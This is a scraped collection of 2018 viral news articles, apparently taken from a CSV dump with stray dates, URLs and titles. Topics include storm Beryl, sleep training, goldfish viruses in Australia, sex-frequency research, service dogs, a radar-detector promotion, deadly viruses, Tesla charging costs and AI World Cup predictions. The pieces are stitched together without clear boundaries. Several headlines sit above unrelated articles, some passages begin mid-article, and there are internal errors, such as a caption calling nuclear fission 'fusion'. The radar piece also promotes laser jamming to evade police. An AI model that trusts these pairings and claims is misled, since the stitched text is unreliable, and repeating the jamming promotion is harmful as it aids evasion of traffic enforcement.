Tropical storms are less severe than hurricanes, with wind gusts between 39 and 73 miles per hour; a hurricane, by contrast, includes maximum sustained wind gusts between 74 and 95 miles per hour, according to AccuWeather. Though Beryl is not forecast to be at hurricane strength when it reaches the Lesser Antilles, the NHS said some islands can expect “direct impacts from wind and rainfall.”

The NHC is also warning that changes to Beryl’s intensity will be “difficult to predict” due to its very small size.

“Confidence in the official intensity forecast is also lower than normal,” the Center warned. “Rapid changes in intensity, both up and down, that are difficult to predict are possible during the next couple days.”

The first named storm of the 2018 Atlantic hurricane season, subtropical storm Alberto, failed to reach hurricane status. But it still led to several fatalities and approximately $50 million in damage.

Many Caribbean islands, including Puerto Rico, were devastated by intense storms during last year’s hurricane season, which officially lasts from June 1 until November 30.

Some experts have raised concerns that climate change might be generating stronger hurricanes, while climate scientists have warned the 2018 hurricane season could be worse than usual.

We Let Our Baby Cry It Out, and 10 Years Later, This ls What
Happened

",2/07/2018 10:58,https://www.popsugar.com/family/I-Let-My-Baby-Cry-41812513,"Three months into this parenting gig, I'd had enough. Our bedtime routine with our infant son had turned into a two-hour affair that left me and my husband eating dinner at 10 p.m., me up with indigestion for another few hours, and only a few hours of shut-eye before I had to wake up for the day. I was preparing to go back to work, and no amount of concealer, corrector, or eye masks could hide the dark purple circles that had become permanent fixtures under my eyes, never mind function like a thinking adult in an office job.

I needed a solution, and I needed one quick. My own parents swore by ""Ferberizing"" me, and I was willing to give it a try. Ferberizing, or ""crying it out,"" is a sleep training method popularized by Dr. Richard Ferber to teach a baby to soothe him or herself to sleep. The practice involves putting your baby to bed while still awake and leaving her there even if she cries. After a predetermined amount of time, parents can go in and soothe their child (patting her back, talking to her, etc.), without picking her up. Dr. Ferber says that after a few days, the baby learns to soothe herself and fall asleep on her own.

But when I asked for some tips and tricks from the moms in my moms group at the local park, I was greeted with blank stares and astonishment. One suggested it was a form of torture and that my baby would never trust me again. Another clenched her chest, saying she ""could never!"" And the one sitting next to me pointedly scooted a few inches away from me.

After that reaction, could I really do it? You don't get much closer than me and my parents, so it doesn't seem to have affected our relationship. And I really needed to get into a routine before returning to work.

So on a Wednesday night when my son was 3 months old, I bathed him, lotioned him up, fed him, read him three books, and put him in his crib in a dreamy but still technically awake state. As soon as I closed his door, he was crying. My husband said we should wait another day and try it tomorrow, but I knew that if we put it off today, we'd put it off tomorrow, and we couldn't just do this the night before I went back to work.

The first stretch of crying was painful. I couldn't believe I was letting my baby cry so much. Five minutes later, after soothing him, it appeared that all was well, until two minutes after closing his door, the same thing happened. The next stretch was 10 minutes, and we barely made it through before the timer went off and I raced into his room to begin the routine again. I didn't think we'd make it through the next stretch (15 minutes), until my phone rang. My husband's cousin was calling to check on me and see how I was doing in general. I told her we were Ferberizing and just starting our 15-minute stretch. Before I knew it, my alarm rang that it was 15 minutes. She had talked my ear off for the entire time — mindless things that she probably didn't even care about but was throwing my way to keep me occupied. And I looked at our baby monitor, he was asleep — with a big smile on his face.

I'd never say that it was easy and that we never turned back — no one told me about the torture that is sleep regression or how cutting a tooth can mess up everything! — but we certainly crossed a hurdle that day. And our sleep routine became bearable.

Ten years later, I can tell you that my son has shown no adverse affects from his Ferberization. He still likes me to sit with him when he goes to sleep but can easily do so without me. He still hugs me and treats me as his confidante, but he is also independent and strong-willed. Like recent studies show, the Ferber method is safe, when done correctly.

Someone Has Noticed Something Very Wrong With Spotify's Pause

When Spotify came along even the biggest optimists connected to the platform could not have anticipated the monumental success it would become.

An endless supply of customised playlists and streaming capabilities, the service has completely changed the way we listen to music forever.

On first look, the whole thing seems relatively flawless, a sleek user interface that even the least internet savvy could comfortably navigate.

Take a closer look though, and there’s one extremely infuriating glitch that you definitely will not have noticed before.

One eagle-eyed Twitter user picked up a small flaw with the Spotify pause button and now we’ll never be able to unsee it.

According to Reddit, the pause button in @Spotify is 1 pixel off from being centered… ?? can’t. unsee. must. uninstall. pic.twitter.com/fq07cYRQk5 � Corban Garcia (@CorbanGarcia) June 14, 2018

The observation was made in the ‘mildlyinfuriating‘ subreddit and has obvious sparked a wave of debate and unease amongst Spotify patrons.

Another Reddit user pointed out that it may not have been a mistake after all:

�These things are usually intentional. Instead of being geometrically precise, they go for what looks most satisfying to the eye. There was a popular post a while ago when the nintendo switch was announced; the logo was asymmetric in all kinds of ways. When someone made a version of the logo that was perfectly measured out, it looked really odd even though its design was more consistent.�

An idea that has previously been backed up by Artist David Hellman in regards to the Nintendo Switch logo.

Did you notice the Switch logo is not symmetrical? Each side has a different apparent visual weight, so the logo is “balanced” by eye� pic.twitter.com/rFp34LyOoA � David Hellman (@davidhellman) January 6, 2017

Australian Cats Are Having A Devastating Effect On These Local
Species

",1/07/2018 11:23,https://www.iflscience.com/plants-and-animals/why-you-should-never-put-goldfish-park-pond-or-down-toilet/,"Goldfish might look nice, but they can also spread a variety of decidedly not-nice viruses. kaori/pixabay.com

Have you ever walked past a fountain in the park and seen beautifully coloured fish swimming about, and wondered how they got there? Often with the best of intentions, people leave unwanted pet fish in public fountains, ponds and natural waterways for a variety of reasons, including boredom with their pet, moving house, or frequent illness in their fish.

But these places are not a natural home for ornamental fish, and they can harm Australia’s unique ecosystems.

Fish are very popular pets, for good reason. They take up very little space or time and can add a calming presence to any living room. But fish come with the same responsibilities as any other pet. Much as (I hope) you wouldn’t turn a dog or cat loose to fend for itself in the local area, there is no place for pet fish in our waterways.

Alien Fish Species Harm Our Ecosystems

Rehoming pet fish in natural waterways causes two big issues. The first is that most fish kept as pets are not naturally found in Australia, so releasing them means introducing an alien species into the wild.

These alien fish are pests and can outcompete native fish for shelter, food and other resources. Australia has 34 alien freshwater fish species living in the wild, two-thirds of which are ornamental fish such as goldfish, cichlids, guppies and gourami. Once an alien fish species becomes established, it is impossible to get rid of it.

The second problem is the inadvertent release of exotic diseases. Australia imports 19 million ornamental fish every year – almost one per person! Your pet might appear healthy, but it can carry exotic bacteria and viruses.

When introduced to a new waterway, these pathogens can potentially wipe out entire populations of native fish. What’s more, many unique Australian fish such as Murray cod and Macquarie perch are particularly sensitive to exotic pathogens.

Unsurprisingly, Australia has strict import conditions for ornamental fish (and other pets too). However, there have been two key cases of exotic viruses hitchhiking with imported pet fish.

Goldfish Get Herpes Too!

The first involves a disease called herpesviral haematopoietic necrosis, which affects only goldfish. It is caused by the virus Cyprinid herpesvirus 2 (CyHV2), first isolated in 1992 in Japan after a spate of goldfish deaths. Since then, CyHV2 has caused large goldfish kills in Taiwan, the United States and Britain, and it is now present in Australia. It is not known how long a goldfish can spread the virus once it becomes infected.

You never know what’s under the surface. aussiegall/Wikimedia Commons, CC BY

Before 2010, CyHV2 was considered exotic to Australia and all imported goldfish were required to be certified as free of the virus. Despite this, in 2008 sick goldfish from several pet shops in Sydney tested positive for it. Pet shops stock a mix of imported and domestic fish, so the source of infection was unknown.

To try to trace the source of the virus, my colleagues and I have tested goldfish from farms across Australia and in wild populations. We found CyHV2 at two farms, one in Victoria and one in New South Wales. More importantly, the virus was found in wild goldfish collected from Cotter Reservoir, ACT, and the Ovens and Murray River in Victoria.

Our results confirmed that CyHV2 was present in both domestically farmed and wild goldfish populations. The virus is now considered an established pathogen in Australia, and in 2011 the Department of Agriculture dropped the requirement for goldfish to be certified free of CyHV2 before entering the country.

Goldfish were first introduced to Australia in 1876 and have long been established in all states except the Northern Territory. Although we can’t be sure when the introduction of CyHV2 occurred, it is assumed to have been within the past two decades.

Once established, pathogens like this are almost impossible to eradicate. The good news is that CyHV2 infects only goldfish, which is an alien species and is not vital to our ecosystems.

Lessons Learned

The second case involves a pathogen called infectious spleen and necrosis virus (ISKNV). This belongs to a group of viruses called the megalocytiviruses, notorious for killing large numbers of fish farmed for human consumption as well as ornamental fish. ISKNV kills Murray cod, and our soon-to-be-published research suggests it can also cause disease in Macquarie perch and Golden perch.

Research has identified imported ornamental fish infected with ISKNV both before and after quarantine. Infected fish have also been found at pet shops and at a fish farm in Queensland. However, all the ornamental fish collected from the wild tested negative for the virus. From March 2016 onwards, regulations for imported fish have been tightened to clamp down on this virus.

ISKNV is still considered exotic to Australia. To protect Australia’s biodiversity and aquaculture industries, changes to importing ornamental fish were introduced from March 2016. This shows how, with the right monitoring, exotic pathogens can be spotted and dealt with before they become established in the wild.

Caring For Your Fish – And The Environment

Like any pet, the decision to bring a pet fish home should be made with the care and thoughtful consideration that is owed to these beautiful creatures. If you can no longer care for your pet fish, the best choice is to find another living room for it to enjoy. Alternatively, you can take it to your veterinarian who can kill it humanely. If your fish has died, throw it in the rubbish bin, not down the toilet!

Ornamental fish are devastating to our natural waterways. Greater awareness of responsible pet fish ownership could have avoided alien species establishing themselves in the wild and prevented death and disease among Australia’s native fish.

Here's How Much Sex You Should Have Every Week
Wondering how much sex is normal? Researchers have an answer. Having Se...
",30/06/2018 22:12,https://time.com/4692326/how-much-sex-is-healthy-in-a-relationship/,"Sex and health go hand in hand. Research has linked it to a slimmer waistline, a stronger heart and a lower risk for prostate and breast cancers. It’s also a boon for mental health, since sex is associated with lower rates of depression and better mood.

But Americans today are having less of it than Americans a decade ago, according to a just-released study appearing in Archives of Sexual Behavior.

From 2010 to 2014, the average American adult had sex nine fewer times per year than Americans did from 2000 to 2004, the researchers found. That drop in frequency was even steeper for married couples who live together; they had sex 16 fewer times a year.

What’s going on? “We can only speculate,” says the study’s first author, Jean Twenge, a professor of psychology at San Diego State University and author of Generation Me. But the increase in time spent working and parenting may be possible explanations for the drop in sex among married people. she says. Plus, with the rise in quality and accessibility of streaming entertainment, competition for free time is stiffer. “There are now so many other ways to spend leisure time at home,” she says. The allure of Netflix and other device-based diversions may be elbowing sex aside.

But despite these declines in hanky panky, our lives are far from sexless. The average adult enjoys sex 54 times a year, or a little more than once a week, Twenge’s data show. While married couples under the same roof don’t fool around quite as much, they still have sex about 51 times each year.

That’s a good thing, because having sex once a week may be “optimal” if you’re hoping to maximize happiness, according to research from Amy Muise, an assistant professor of psychology at York University in Canada.

Muise and her study team found that couples who have a lot of sex tend to experience better wellbeing. “Sex is associated with feeling more satisfied in a relationship,” Muise says. But beyond once a week, the wellbeing benefits of sex seem to level off. That’s not to say that having sex a few times a week (or more) is a bad thing. It just doesn’t seem to make couples any happier, she says.

Of course, it’s hard to show cause and effect when it comes to sex and your health. Leading a happy, healthy lifestyle likely leads to more sex; the act itself doesn’t necessarily improve your physical and mental wellness. Still, whether sex is a symptom or a cause of wellbeing, a healthy sex life is worth the work.

If you’re falling short of that once-a-week quota, making an effort to have more sex could be a good idea, as long as it doesn’t feel too forced. A 2015 study from Carnegie Mellon University concluded that couples who tried to have more sex did not feel happier—but that study’s author, economics and psychology professor George Loewenstein, takes his own findings with a grain of salt. “In retrospect, I believe that this study was misguided,” he says. “Instructing couples to double their frequency might have turned sex into a chore for them.” Muise also points out that the couples in Loewenstein’s study were already having sex once a week. “It’s possible that they were already maximizing the association [between sex and] wellbeing,” she says.

“I still think that couples could benefit from a bit of outside encouragement to have more sex,” Loewenstein says. That’s especially true if you and your significant other have been together for a long time. “When a couple has been together for some time, the mere presence of the other person, even unclothed, ceases to be exciting or arousing.” But that doesn’t mean doing it won’t be just as fun and invigorating as it used to be, he says. It may just take a little more work to get your fires started.

But this study from Japan has a stunning solution for curbing suicide attempts: blue-colored lights.

According to CityLab, Japanese railways have been attempting to stop train station suicides throughout their metropolitan areas for some years now, but the implementation is tricky. Tokyo is currently working towards their goal of installing preventative barricades in all 243 of their stations by 2023 – but the barriers are expensive to construct, and many train stations lack the infrastructure to support the barricades.

So until a more efficient solution is used, stations are relying on the calming effects of blue light as a means of dissuading potential suicide victims.

The research, which was published in the Journal of Affective Disorders, studied the effects of installing blue light-emitting-diode (LED) lamps on railway platforms and at railway crossings as a way of deterring suicides in 71 different stations.

Over the course of 10 years, the suicide rate at the stations plummeted by 84%.

“As blue lights are easier and less expensive to install than platform screen doors, they can be a cost-effective method for suicide prevention,” says the study’s authors.

Since the study was published, several UK train stations have implemented similar fixtures in their own facilities. In addition to suicide rates falling, the station works have also provided anecdotal evidence that there have been less incidents of vandalism and crime as well.

According To A New Study, This ls The Worst Country In The World
For Women
",27/06/2018 13:13,https://www.iflscience.com/environment/the-cheapest-way-to-a-zeroemission-world-needs-nuclear-power-claims-new-study/,"An analysis of the costs to reach net-zero in many countries sees nuclear fusion power as the cheapest option. Image Credit: TTstudio/Shutterstock.com

New generation nuclear power stations might be crucial to achieving the target of zero emissions by mid-century and staving off the worst of the climate crisis, a new study published in the journal Nature Energy suggests.

Solar power and wind are key to hitting this goal, but they might not be enough without major investments, or in places without much sun or wind.

To minimize the catastrophic consequences of global warming, humanity needs to keep the global mean temperature below the threshold of 1.5 C above the pre-industrial average. Crucial to achieving that is energy production reaching zero emissions globally by 2050. Previous studies have shown that by ramping up solar and wind power stations, our species can easily reduce emissions by 80 percent.

To achieve the goal of 100 percent reduction, there ought to be major expansions in energy storage capabilities and electricity transmission capabilities. This is because the wind doesn’t always blow and the sun doesn’t always shine. If these expansions aren’t or cannot be implemented, there’s a need for more zero-carbon energy sources – and that’s where new designs of advanced nuclear power plants come in.

“Under strict greenhouse gas emission controls, reliable power generation provided by nuclear power has a lot of potential value in the electricity grid for most nations,” lead author Lei Duan of the Carnegie’s Department of Global Ecology said in a statement.

“Places with poor wind resources can benefit from nuclear earlier in the path to zero emissions, whereas places with very good wind resources would only need it to get rid of the last traces of carbon emissions.”

The model looked at 42 country-level regions and used current prices for technology to estimate the cheapest way to achieve zero emissions. The researchers found that nuclear power is the scenario that would cost less.

“Our analysis looked at the cheapest way to eliminate carbon dioxide emissions assuming today’s prices. We found that at today’s price, nuclear is the cheapest way to eliminate all electricity-system carbon emissions nearly everywhere. However, if energy storage technologies became very cheap, then wind and solar could potentially be the least-cost path to a zero-emission electricity system,” added Ken Caldeira, also of the Carnegie’s Department of Global Ecology.

There are many people that do not like nuclear power (we are talking fission here, rather than the still experimental fusion). One main issue is the disposal of waste in a safe manner, since many countries continue to lack the proper investment into this. Finland, for example, is burying it in a special facility where it will be sealed for the next 100,000 years (although it won’t be very dangerous in just a few hundred years).

Another risk often raised is the possibility of a nuclear accident – however, while it is a risk, it is important to put it in context. Air pollution, which coal and oil powerplants contribute to, is responsible for millions of deaths every year. The World Health Organization estimates that the Chernobyl disaster, the worst nuclear accident in history, led to the premature deaths of 4,000 people.

Nuclear power might not be needed if energy storage solutions can be found, but if they are not, we might not have many other options.","The Cheapest Way To A Zero-Emission World Needs Nuclear Power, Claims New Study",

In fact, getting past this stage helps test the strength of the relationship. But with every test also comes the risk of failing.

Now of course, when getting married, most people try to stick to their vows to stay loyal to each other, but the 7-year itch can prove to be quite a difficult task to overcome for many people in serious commitments. A term used by psychologists, it suggests the notion that around the 7-year mark of marriage individuals become a little distant with each other as their happiness and satisfaction with the relationship begins to decline, and the urge to stray gets stronger.

A research team from Israel looked into reasons why people who have been tempted to cheat have managed to resist. What they discovered, published in The Journal of Sex Research, was they were able to identify the most likely time men and women are most at risk of cheating in a marriage.

Superdrug Online Doctor

The researchers asked 423 participants to answer a questionnaire rating the importance of 29 different reasons to avoid and resist cheating, as well as state the likelihood of them cheating if the opportunity presented itself.

The research saw that there were numerous reasons why those who took part in the questionnaire resisted being unfaithful, mostly to do with their moral compass and the fear of being single. Their findings also revealed that, for women, the window of time when they were more likely to cheat on their partners was between the 6-10 years mark.

However, the study also showed that when it came to men cheating in heterosexual marriages, they were most likely to cheat after 11 years, showing they're no angels either.

Earlier this year Superdrug's Online Doctor ran a survey of over 2,000 Americans and Europeans to work out why men and women cheated. Interestingly, the number one reason for both heterosexual men and women both sides of the Atlantic were the same. For both American and European women, the top reason was down to feeling like they weren’t being given enough attention from their partner. For American and European men, their top reason was that the other person was ""really hot"".","This Is When You're Most Likely To Be Cheated On, According To A New Study",

Ask any East Coast or West Coast burger-lover, and they will likely have an opinion on a timeless debate. Which burger is better—In-N-Out or Shake Shack? For In-N-Out lovers, the hope for some East Coast locations is strong. But there’s one main reason why the chain hasn’t expanded far from the Pacific—frozen patties.

The company refuses to sell frozen patties to ensure that customers are only eating the highest-quality meat, according to the official website. That’s why all In-N-Out restaurant locations are within 300 miles of In-N-Out’s patty-making facilities. These facility locations are only in California and Texas, hence the lack of any East Coast locations. This commitment to fresh food applies to other key ingredients, too—the fries are hand-cut, the lettuce is hand-leafed, and the buns are freshly baked. Not to mention, the chain locations don’t have any freezers or microwaves. Don’t have an In-N-Out nearby? Make our best copycat recipes (no frozen patties included!).

Other restaurant chains that also use unfrozen beef haven’t had a problem with creating more locations all over America (and the world) including Five Guys, Shake Shack, and Smashburger.

There are a few other reasons, however, as to why In-N-Out hasn’t expanded. Lynsi Snyder—the company president and only grandchild of the In-N-Out founders Harry and Esther Snyder—said that they would never franchise, Business Insider reports. Plus, limiting locations of the fast-food restaurant also minimizes competition while giving the chain an exclusive appeal.

",20/06/2018 8:15,https://www.elle.com/culture/celebrities/a39283246/ariana-grande-pete-davidson-scooter-braun-doomed-romance/,"Insider's story on Ariana Grande and Justin Bieber's manager Scooter Braun featured more than just insight into Braun's reported impact on Bieber and his ex Selena Gomez's past on-off romance. A source also detailed how management being deeply involved in Grande's relationship—and eventual called-off engagement—to Saturday Night Live comedian Pete Davidson affected the trajectory of Davidson and Grande's whirlwind romance, which ended in October 2018.

Both Davidson and Grande have moved on now. Grande is married to Dalton Gomez, and Davidson is dating Kim Kardashian, much to the chagrin of Kardashian's ex (and Braun's former client) Kanye West.



Insider reported that Braun actually introduced Grande and Davidson. A month after their breakup, Grande released “Thank U, Next,” a massive commercial success for her with its record-breaking YouTube video. (It was the most watched music video debut in the platform's history.)

A person close to the situation told Insider that Davidson felt “blindsided” by the release. “I think their relationship didn't get a fair shake because management was so involved.”

Davidson admitted to be blindsided by the song coming out during a late December 2018 comedy show in Boston. A source told E! then that Davidson joked about it during the show, saying, “Here's the thing about the breakup song. Usually breakup songs you know who it's about but you don't really know. That G named all of us. Bam. She named all of us. And then, tells us, yeah, he has a big dick.”

Davidson, noting the video came out right before he had to go on SNL, said, “That shit came out before I had to put on a f*cking duck hat and be like, ‘derrrp here's the pizza!’ So all my friends were there. It was a sad day. We didn't know it was going to happen.”

Upon playing it, Davidson and his friends, “We're all like, ‘Ehhh… it's ok.’ We're like ‘Okay, it's not that bad for you.’” In the song, Grande sings of Davidson, “Even almost got married / And for Pete, I'm so thankful.”

Grande told Billboard in a story released weeks before Davidson's comedy show that she did send Davidson “Thank U, Next” before releasing it. “I wasn’t going to blindside anybody,” she said.

Grande later reflected on their romance to Vogue in her cover story published in July 2019. After her breakup with Mac Miller, “My friends were like, ‘Come [to New York City]! We’re gonna have a fun summer.’” she recalled. “And then I met Pete, and it was an amazing distraction. It was frivolous and fun and insane and highly unrealistic, and I loved him, and I didn’t know him. I’m like an infant when it comes to real life and this old soul, been-around-the-block-a-million-times artist. I still don’t trust myself with the life stuff.”

“I think that this is the first album [Thank U, Next] and also the first year of my life where I’m realizing that I can no longer put off spending time with myself, just as me,” she added. “I’ve been boo’d up my entire adult life. I’ve always had someone to say goodnight to. So Thank U, Next was this moment of self-realization. It was this scary moment of ‘Wow, you have to face all this stuff now. No more distractions. You have to heal all this shit.’”

Service Dogs have a particular bond with their owners/charges, mainly because they are often employed to keep their handler safe.

But what happens if you are approached by a service dog who has no owner present? The immediate thought is it has been abandoned or lost.

Advert 10

However, there’s a good reason why they’re coming to you and it could be the difference between life and death.

Thanks to a viral Tumblr post, which was shared by Melissa Hope on Twitter who wanted to spread this important message, you’ll now know what to do.

In Melissa Hope’s Twitter post she wrote:

If a service dog without a person approaches you, it means the person is down and in need of help.

The story comes after the original poster suffered a bad fall. Even though they were okay, their dog was under the impression they were in serious pain and went to go find another adult, as they have been trained to do.

The post went on to say:

Advert 10

I went after him after I had dusted off my jeans and my ego, and I found him trying to get the attention of a very annoyed woman. She was swatting him away and telling him to go away. Don’t get scared, don’t get annoyed, follow the dog! If it had been an emergency situation, I could have vomited and choked, I could have hit my head, I could have had so many things happen to me.

Since being posted the message has been shared over 154K times, in the hope people would get the message. People on Twitter also messaged her, thanking her for bringing it to the world’s attention.

One person wrote:

This is important. When I see a service dog, I try to stay as far out of their way as possible. They’re doing a job, after all. I’d shoo one away because I’d be fearful they weren’t doing their job.

Someone else thanked her:

Thanks for sharing this, I had no idea.

Another person said:

I had no idea….thanks for the heads up.

A spokesperson from Guide Dogs (UK) did clarify this is not an action they train their UK-based service dogs to perform.

While service dogs are more than happy to help those in need, as it’s what they’re trained to do, once in a while they need a break too. In April, volunteers from Canine Companions for Independence took a group of well-behaved service dogs on a field trip to Disneyland and the photos quickly went viral.

The non-profit organisation trains assistance dogs for children and adults with disabilities.

Once the pups have completed training, they’ll become fully-fledged service dogs, going out to people in need, all for free.

The majority of the dogs came from Sacramento and were raised by volunteers, including Laura Allen, who’s raised eleven puppies so far.

Speaking to ABC10, Allen revealed the dogs’ favourite part of the trip was meeting and greeting all the Disney characters.

She also stated how the outing is vital when it comes to training:

It’s great socialisation for the dogs. There are different sounds, people, kids.

Allen explained she regularly takes dogs to Disneyland but this is the first time they’ve got so much attention online.",What To Do If A Service Dog Approaches You Without An Owner,

If there’s one market that can definitely be a little bit confusing at times, it’s that of the radar detector. When you’re dropping your hard earned cash on something like this, you want to make sure that it’s an investment, after all, saving you the big bucks in the long run instead of just taking your money and letting it flow out of the window as you toss it into the breeze.

With many detectors, you might not even know what you’re getting and because of that, we had John, the President of Radenso Radar come out to give us the rundown of what they stand behind as the best radar on the market. In the long run, between tickets and insurance hikes because of violations this one could be smart to pick up for yourself.

Why is this thing so great? Well, with a plethora of features that are built right in, you’re basically safe from most real-world situations that are going to arise in your path, even protection from some of the most advanced technology that we’re sure some police departments don’t even have yet. In other words, where some might fall short, it really seems like this Radenso RC M has you covered.

It all starts out with what John describes to us as “the best sensitivity on the market,” meaning that if someone is trying to track down your speed, you’re getting the best possible chance to be alerted to that, this technology can detect radar and jam laser.

Now, we know that we can trust John’s word but in an age of lots of empty promises, both John and our crew here at Speed Society decided that it would probably be best to show this thing off and highlight its features in the real world. To be honest, with a Ford Raptor and the Speed Society giveaway SRT Viper, testing it out was a ton of fun.

The show was cancelled back in 2009, but it's remembered fondly by fans of titular comedian Chris Rock and general sitcom enthusiasts alike.

For many, the breakout star of the show was Vincent Martella, who starred as the young Chris' best friend (and the only person at high school who doesn't bully him) - the endearingly nerdy Greg Wuliger.

Despite the success of other actors who made their names in the show, however, Vincent has barely been seen on television since.

He provided the voice for Phineas Flynn in the long-running animated show Phineas and Ferb - as well as for the related video games, and a few Final Fantasy games as well - but his face has been almost completely absent from our screens.

However, images shared from his social media pages recently have proved that he's alive and well - and still getting work, thankfully. Vincent is still acting, largely in voice roles, and has even made brief appearances as secondary characters on shows such as The Walking Dead.

He's an avid Instagrammer, with just over 94,000 followers, and has completed a degree in business via the University of Florida.

And, of course, he's changed plenty since he portrayed the teenage Greg alongside Chris Rock. Still only 25 years old, he has gone from the gawkiest of gawky teens to, well, quite the cool kid. Nice work, mate.

While shows like Arrested Development, 30 Rock and Parks and Recreation have garnered justified critical acclaim, there hasn't been quite as much love for Chris Rock's comedy-memoir - probably because, unlike the others above, it isn't really edgy at all.

Loading…

Instead, it's a superbly observed, well-meaning and occasionally political show about the life of one black teenager in New York in the 1980s as he tries to deal with a wider white society, seen through his high school.

These ambiguous, definition-bucking little beasties, found in every single environment on Earth, play a variety of roles – and the ancient precursor to one seems to play a role in how we form memories. Saying that, plenty of viruses can cause lethal infections in humans, with some being deadlier than others.

Without a doubt, influenza is the single biggest killer of them all. Back in 1918, between 50 and 100 million people died after being infected by the virus, which was around 5 percent of the planet’s population at the time. Overall, half a billion people were infected. Far from taking the lives of those that were otherwise vulnerable – the already sick, the elderly, or the very young – it spared no one.

There are several myths surrounding the pandemic, but it’s safe to say that it was the deadliest mass infection in human history. In fact, it’s something that plenty, including Bill Gates, have warned could happen again if we take our eye off the ball, or if we defund key agencies tasked with keeping the wolf from the door.

By total number of deaths, there’s no competition: The H1N1 strain of influenza virus is by far and away the most lethal in this respect. What if, though, we look at the mortality rate of viral infections instead – the number of infected people that ultimately die?

At a rough estimate, based on the high-end deaths value, H1N1’s case fatality rate (CFR) back then was roughly 20 percent. As it turns out, there are viruses that have frighteningly higher CFRs out there in the world today.

Take rabies, for example. This is a disease that, according to the World Health Organization (WHO), occurs in more than 150 countries around the world. It’s present on every single continent, except Antarctica, and 99 percent of human transmissions occur through dog bites. Children aged between 5 and 14 years are the most frequent victims.

Different variants have different incubation periods and epidemiologies. Those with “furious rabies” can become hyperactive and develop a fear of water and sometimes fresh air. A few days later, cardiorespiratory arrest occurs.

Those with paralytic rabies take longer to die. It begins to immobilize your muscles at the bite point, and eventually you fall into a coma and die as your brain and spinal cord continually inflame.",What's The Deadliest Virus In The World?,

Romeo-Luis Ramirez shared on his Twitter account how he tried to refrigerate his drink since there were no means to do that in his office.

Ramirez is a pharmacist by profession and works as a research assistant at the Institute of Pharmaceutical science at the UP National Institutes of Health.

“I always rush in the morning to beat Manila traffic. Oftentimes, I fail to eat breakfast at home. Before going straight to the office, I pass by a bakeshop first to buy 2 egg pies, then walk across the street to buy 1 bottle of soya milk at a convenience store. It was already 2 pm that day when I realized that I forgot to drink my *supposedly chilled* soya.”

Ramirez realized that since there was no refrigerator in the office, he thought of using the aircon to chill his drink.

I grabbed a foot of scotch tape on the overhead shelf, wrapped it around the bottleneck of my soya, and left the whole thing hanging from the curtain blinds as seen in the picture. My null hypothesis was my drink couldn’t be cool again when directly placed in front of the aircon for some time. On the other hand, my alternative hypothesis was, my drink could be cool again like what it was when I bought it in the morning. Voila! After an hour of waiting that afternoon, I tried drinking from the bottle and observed a change in temperature, however not that significant. Only in my second hour of waiting, I can convincingly say to myself, “my drink is already cool enough to quench my thirst!” I bet this strategy isn’t new to some. For sure, others will only have to spend few minutes of waiting as long as the thermostat is set to maximum, and the master control is on “high cool”. In my case, I opted not to set the aircon’s settings to its fullest since I didn’t want my workmates and I freezing inside the office.

Needless to say, Ramirez’s experiment was successful.

One of the key advantages of electric vehicles is not having to pay for petrol. This was particularly great for Tesla owners when charging stations were still free.

But for those who primarily charge at home on a daily basis, does it really work out cheaper?

Tesla recently crunched the numbers against the Model X 75D.

The auto manufacturer calculated that 7 kWh per day is enough to replenish the average daily commute. This number was drawn from the Australian Bureau of Statistics, which calculated the average annual commute at roughly 15,000km.

This stat was then combined with average Australian energy prices obtained from Canstar Blue electricity and concluded that is costs approximately $2.44 per day to charge a Model X 75D. That $890.60 over the course of 12 months — which is a whole lot less than what I have ever paid for petrol.

There are also ways to bring this number further down — even if you don’t have solar panels and a Powerwall, which is another story entirely. AGL have a 12-month program that offers $1 per day for electric vehicle charging, which makes the total $365 for the first year. Tesla also offer 400 KWh Supercharger credits (roughly 1,600km) annually to Model S and X owners.

Of course, these numbers are based off general statistics and one particular Tesla model, so the numbers aren’t going to be entirely accurate. There are always outliers (It will cost a lot more if you’ve come back for a longer trip, for example) and Tesla owners are going differ when it comes to usage and charging behaviour — not to mention differences in electricity providers alone. Still, it’s good to have a petrol comparison, as well as a rough idea of how much an EV will add to your electricity bill over time.",How Much It Costs To Charge A Tesla Model X Each Day,

SCIENCEALERT.COM

",15/06/2018 8:20,https://www.sciencealert.com/ai-runs-100-000-russia-world-cup-simulations-to-pick-winner,"With the biggest event in the soccer calendar now underway, fans are speculating on which team might emerge victorious from the 2018 World Cup in Russia – and an artificial intelligence model based on 100,000 simulations has made its prediction too.

Using a database of statistics from previous tournaments, and three different AI methods to crunch the numbers, the international team of researchers behind the work thinks Spain is going to emerge victorious... but it's going to be close.

At the moment the bookmakers are backing Germany to be World Cup winners, but the AI analysed both the strength of the teams and their route to the final. While Germany would beat Spain in a one-off game, the models showed, the German team is likely to face more difficult opponents through the course of the competition.

""By analysing the winning probabilities conditional on reaching the single stages of the tournament, it turns out that the fact that overall Spain is slightly favoured over Germany is mainly due to the fact that Germany has a comparatively high chance to drop out in the round of 16,"" write the researchers.

The research team was made up of academics from Technische Universitat Dortmund, the Technical University of Munich in Germany, and Ghent University in Belgium.

They used three techniques to process the statistics: Poisson regression (interpreting and weighing many different variables), ranking method (evaluating the current strength of each team), and the random forest approach.

For the World Cup, the random forest method is particularly suitable. It can be structured like a football tournament, but its secret sauce is in the way it uses machine learning to map out random branches for a decision tree - different scenarios and their consequences - many times over.

By getting the AI to place emphasis on different factors when producing the decision trees, repeating the simulations and then comparing across factors, the forest method can give statisticians a better look at which factors are most important in the ultimate outcome - such as the opponents Germany and Spain are likely to face.

Compared with other mathematical models, it also gives more accurate information later on in the decision tree, where training data might be scarce.

The researchers plugged in a whole host of source data to inform their models. By looking back at previous tournaments, they found some factors were important (like the number of Champions League players on a team) and some were less so (like the nationality of a team's coach).

With the statistics showing a combination of ranking methods and random forest trees were the most accurate predictors, the 100,000 simulations of the 2018 World Cup were run based on these models.

Spain emerged at the top, with a 17.8 percent chance of winning. Germany is second on 17.1 percent, Brazil third on 12.3 percent, France fourth on 11.2 percent, and Belgium fifth on 10.4 percent.

Saudi Arabia, meanwhile, has a zero percent chance of reaching the final. (Apologies to anyone rooting for them.)

Keep your eyes on your tournament wall charts though – should Germany make it through to the quarter finals, the last eight teams, the team has an equal chance with Spain.

The probabilities of teams progressing and winning. (arXiv.org)

Not everyone agrees with that assessment though. Financial firm Goldman Sachs has trained its own machine learning engines on the World Cup in Russia and reckons Brazil is going to emerge victorious. The Goldman Sachs calculations also involved elements of random forest modelling.

Of course soccer, and sport in general, has a long history of upsetting both bookmakers and AI models. It's very difficult to take into account everything that might affect a team's performance – and what machine learning algorithm can predict a spectacular goal being created out of nothing?

